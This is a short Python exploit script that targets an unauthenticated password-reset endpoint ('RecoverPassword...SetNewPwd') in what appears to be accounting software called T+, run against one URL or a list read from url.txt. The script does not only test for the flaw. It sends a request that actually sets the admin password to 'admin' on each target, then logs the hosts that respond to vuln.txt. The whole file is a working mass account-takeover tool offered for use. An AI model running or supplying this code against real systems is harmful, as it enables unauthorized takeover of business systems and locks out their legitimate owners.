import argparse
import requests
import json
import os
import sys

headers = {
"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "zh-CN,zh;q=0.9",
}

#21232f297a57a5a743894a0e4a801fc3 == admin
data = json.dumps({"pwdNew":"21232f297a57a5a743894a0e4a801fc3"})

def write(u):
	f=open("vuln.txt","a+")
	f.write(u+"\n")
	f.close()

def post_url(u):
	payload = "/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd"
	url = u + payload
	response = requests.post(url=url,data=data,headers=headers,verify=False,timeout=5)
	if "value" in response.text:
		print(u + "----------has vuln")
		write(u)

if __name__=="__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument('-u', '--url', help='Target URL', dest='url')
	parser.add_argument('-f', '--file', help='Target URL.txt', dest='file')
	args = parser.parse_args()
	if args.url:
		url = args.url
		if url.endswith('/'):
			url = url[:-1]
			post_url(url)
		else:
			post_url(url)
	elif args.file:
		if os.path.exists("url.txt") == True and sys.argv[2] == "url.txt":
			with open("url.txt") as f:
				for line in f.readlines():
					url = line.strip()
					post_url(url)			
		else:
			print("[Errno] File must be used: \'url.txt\'")
	else:
		print(parser.format_help())
		quit()
